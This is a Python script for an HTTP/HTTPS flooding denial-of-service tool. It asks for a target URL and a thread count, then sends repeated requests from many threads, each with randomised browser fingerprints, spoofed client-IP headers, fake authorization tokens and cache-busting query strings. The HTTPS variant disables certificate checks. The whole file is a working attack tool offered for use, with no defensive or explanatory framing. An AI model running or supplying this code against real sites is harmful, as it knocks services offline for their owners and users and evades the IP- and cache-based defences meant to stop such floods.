#!/usr/bin/env python3
import sys
import os
import time
import random
import string
import threading
import socket
import ssl
import urllib.parse

ascii_art = """⠀⠀⠀⠀⠀⠀⢀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⠟⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡻⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡇⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠘⣧⠀⡀⠀⠀
⠀⠀⠀⣰⡏⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢸⣧⠀⠀⠀
⠀⠀⢰⠃⢸⠄⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⢾⠈⣧⠀⠀
⠀⠀⢸⡄⢸⣄⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⢀⡏⢀⣟⠀⠀
⠀⢠⠿⡇⠈⣿⡀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⣽⠇⢀⡟⡆⠀
⠀⢸⠀⢻⠂⠸⣷⡀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⢀⣼⡟⠀⡺⠀⣹⠀
⠀⣼⡃⢸⣷⠄⢹⣿⣆⠸⣏⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢡⡇⢀⣿⣯⠀⣴⡗⠀⣿⡀
⢸⡇⢷⣄⠹⣷⣬⣿⣿⡛⠻⣆⠀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠚⠁⢀⡿⠛⣻⡿⢡⣼⠟⢀⡼⠁⡇
⠀⢳⡀⣷⣄⡸⣿⣮⣿⣷⡀⠙⣶⣄⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⣀⣴⠏⠀⣾⣿⣥⣿⠏⣀⣼⠁⡼⠃
⠀⠈⣯⠈⢿⣦⡘⣿⡄⠙⢦⣀⢽⣿⣿⠶⠄⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⠠⠶⣾⣿⡿⢁⡴⠛⢁⣼⠁⣴⡿⠋⣸⠇⠀
⠀⠀⢸⠻⣆⠙⣿⣿⣿⣆⠀⢻⣷⣾⣿⣅⠀⠀⠀⣱⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢀⣽⣷⣾⡟⠀⢀⣾⣿⣿⠋⣐⡾⣻⠀⠀
⠀⠀⠈⢧⡈⢿⣬⣽⣿⣉⠙⢲⣮⣽⡇⠀⠀⢀⡞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡆⠀⠀⢰⣿⣵⡶⠚⢉⣹⣟⣡⣼⠏⣠⠃⠀⠀
⠀⠀⠀⠘⢷⣄⡉⠻⣿⣿⣥⣤⣿⣿⣿⡋⠀⠈⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠃⠀⢘⣿⣿⣿⣤⣤⣿⣿⠟⠋⣀⡴⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠙⠒⢬⡿⠋⠀⠀⣘⣿⣷⡟⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⢘⣾⣿⣇⡀⠀⠈⢻⡯⠔⠚⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠷⢤⡞⠉⠀⣩⣿⣿⣾⠀⠀⠈⢣⠀⠀⠀⠀⣰⠃⠀⡀⢻⣿⣿⣯⡀⠉⠓⡦⠽⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣠⠞⠁⣰⠻⣿⣿⡧⠤⢌⣱⠄⠀⢾⡁⠤⢤⡿⣿⠟⢧⠀⠙⣦⣾⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣦⣧⣤⣏⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⣜⣧⣬⣧⣶⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
]

accept_langs = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "id-ID,id;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9", "de-DE,de;q=0.9", "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "ru-RU,ru;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9"]
encodings = ["gzip, deflate, br", "gzip, deflate", "br", "identity", "*"]
connections = ["keep-alive", "close"]
cache_controls = ["max-age=0", "no-cache", "no-store", "must-revalidate", "private", "public"]
pragma = ["no-cache", "cache", ""]
sec_fetch_dests = ["document", "image", "script", "style", "empty"]
sec_fetch_modes = ["navigate", "no-cors", "cors", "same-origin"]
sec_fetch_sites = ["none", "same-origin", "same-site", "cross-site"]
upgrade_insecure = ["1", "0"]
dnt = ["1", "0", ""]
te = ["trailers", ""]
x_requested_with = ["XMLHttpRequest", "Fetch", ""]
platforms = ["Windows", "macOS", "Linux", "Android", "iOS"]
archs = ["x86", "arm", "x86_64"]
ects = ["4g", "3g", "2g"]

def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def build_packet(host, path):
    ua = random.choice(user_agents)
    lang = random.choice(accept_langs)
    enc = random.choice(encodings)
    conn = random.choice(connections)
    cc = random.choice(cache_controls)
    pr = random.choice(pragma)
    sfd = random.choice(sec_fetch_dests)
    sfm = random.choice(sec_fetch_modes)
    sfs = random.choice(sec_fetch_sites)
    ui = random.choice(upgrade_insecure)
    dnt_val = random.choice(dnt)
    te_val = random.choice(te)
    xrw = random.choice(x_requested_with)
    xff = random_ip()
    cf_ip = random_ip()
    xri = random_ip()
    tci = random_ip()
    xci = random_ip()
    xfp = random_ip()
    rip = random_ip()
    cip = random_ip()
    query = random_string(8) + "=" + random_string(16)
    cookie = random_string(12) + "=" + random_string(24)
    auth = "Bearer " + random_string(32)
    xid = random_string(16)
    xreq = random_string(16)
    xtrace = random_string(32)
    xspan = random_string(16)
    plat = random.choice(platforms)
    arch = random.choice(archs)
    ect = random.choice(ects)
    mem = random.choice([2, 4, 8, 16])
    down = round(random.uniform(0.5, 10.0), 1)
    rtt = random.randint(20, 200)
    vw = random.randint(800, 1920)
    save = random.choice(["on", "off"])
    chrome_v = random.randint(110, 120)
    
    headers = [
        f"GET {path}?{query} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {ua}",
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        f"Accept-Language: {lang}",
        f"Accept-Encoding: {enc}",
        f"Connection: {conn}",
        f"Upgrade-Insecure-Requests: {ui}",
        f"Sec-Fetch-Dest: {sfd}",
        f"Sec-Fetch-Mode: {sfm}",
        f"Sec-Fetch-Site: {sfs}",
        f"Sec-Fetch-User: ?1",
        f"Cache-Control: {cc}",
        f"Pragma: {pr}",
        f"X-Forwarded-For: {xff}",
        f"CF-Connecting-IP: {cf_ip}",
        f"X-Real-IP: {xri}",
        f"True-Client-IP: {tci}",
        f"X-Client-IP: {xci}",
        f"X-Forwarded-Proto: https",
        f"X-Forwarded-Host: {host}",
        f"X-Forwarded-Port: 443",
        f"X-Forwarded-Server: {host}",
        f"X-Originating-IP: {xfp}",
        f"X-Remote-IP: {rip}",
        f"X-Remote-Addr: {cip}",
        f"X-Custom-Request-ID: {xid}",
        f"X-Request-ID: {xreq}",
        f"X-Trace-ID: {xtrace}",
        f"X-Span-ID: {xspan}",
        f"Cookie: {cookie}",
        f"Authorization: {auth}",
        f"Origin: https://{host}",
        f"Referer: https://www.google.com/search?q={random_string(8)}",
        f"DNT: {dnt_val}",
        f"TE: {te_val}",
        f"X-Requested-With: {xrw}",
        f"Priority: u=0, i",
        f"Viewport-Width: {vw}",
        f"Device-Memory: {mem}",
        f"Downlink: {down}",
        f"ECT: {ect}",
        f"RTT: {rtt}",
        f"Save-Data: {save}",
        f"Sec-CH-UA: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"{chrome_v}\", \"Google Chrome\";v=\"{chrome_v}\"",
        f"Sec-CH-UA-Mobile: ?{random.choice([0, 1])}",
        f"Sec-CH-UA-Platform: \"{plat}\"",
        f"Sec-CH-UA-Platform-Version: \"{round(random.uniform(10.0, 15.0), 1)}\"",
        f"Sec-CH-UA-Full-Version-List: \"Not_A Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"{chrome_v}.0.0.0\"",
        f"Sec-CH-UA-Arch: \"{arch}\"",
        f"Sec-CH-UA-Bitness: \"{random.choice([32, 64])}\"",
        f"Sec-CH-UA-Model: \"\"",
        f"Sec-CH-UA-WoW64: ?{random.choice([0, 1])}",
        f"",
        f"",
    ]
    return "\r\n".join(headers).encode()

def hammer_http(host, port, path, stats):
    while stats["running"]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            s.connect((host, port))
            s.send(build_packet(host, path))
            s.shutdown(socket.SHUT_RDWR)
            s.close()
            stats["sent"] += 1
        except:
            pass
        time.sleep(1)

def hammer_https(host, port, path, stats):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('DEFAULT@SECLEVEL=1')
    while stats["running"]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            s.connect((host, port))
            ss = ctx.wrap_socket(s, server_hostname=host)
            ss.send(build_packet(host, path))
            ss.shutdown(socket.SHUT_RDWR)
            ss.close()
            stats["sent"] += 1
        except:
            pass
        time.sleep(1)

def print_status(stats, target):
    while stats["running"]:
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        print(ascii_art)
        now = time.strftime("%a %b %d %H:%M:%S %Y")
        print(f"\n  {now}")
        print(f"  <--packet sent! hammering-->")
        print(f"\n  bot is hammering...")
        print(f"  bot is hammering...")
        print(f"  bot is hammering...")
        print(f"\n  TARGET : {target}")
        print(f"  SENT   : {stats['sent']}")
        print(f"  THREAD : {stats['threads']}")
        print(f"  DELAY  : {stats['delay']}s")
        print(f"\n  Owner Rvpa")

def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(ascii_art)
    print("\n")
    
    threads = int(input("  Thread : "))
    target = input("  Target : ").strip()
    delay = float(input("  Delay  : ") or "1")
    
    parsed = urllib.parse.urlparse(target)
    if not parsed.scheme:
        target = "http://" + target
        parsed = urllib.parse.urlparse(target)
    
    host = parsed.netloc
    path = parsed.path if parsed.path else "/"
    port = parsed.port if parsed.port else (443 if parsed.scheme == "https" else 80)
    is_https = parsed.scheme == "https"
    
    stats = {"sent": 0, "running": True, "threads": threads, "delay": delay}
    
    print(f"\n  [+] Thread : {threads}")
    print(f"  [+] Target : {host}:{port}{path}")
    print(f"  [+] HTTPS  : {is_https}")
    print(f"  [+] Delay  : {delay}s")
    print(f"  [+] Starting hammer...")
    time.sleep(1)
    
    for _ in range(threads):
        if is_https:
            t = threading.Thread(target=hammer_https, args=(host, port, path, stats))
        else:
            t = threading.Thread(target=hammer_http, args=(host, port, path, stats))
        t.daemon = True
        t.start()
    
    status = threading.Thread(target=print_status, args=(stats, target))
    status.daemon = True
    status.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stats["running"] = False
        print("\n  [+] Stopped")

if __name__ == "__main__":
    main()
    
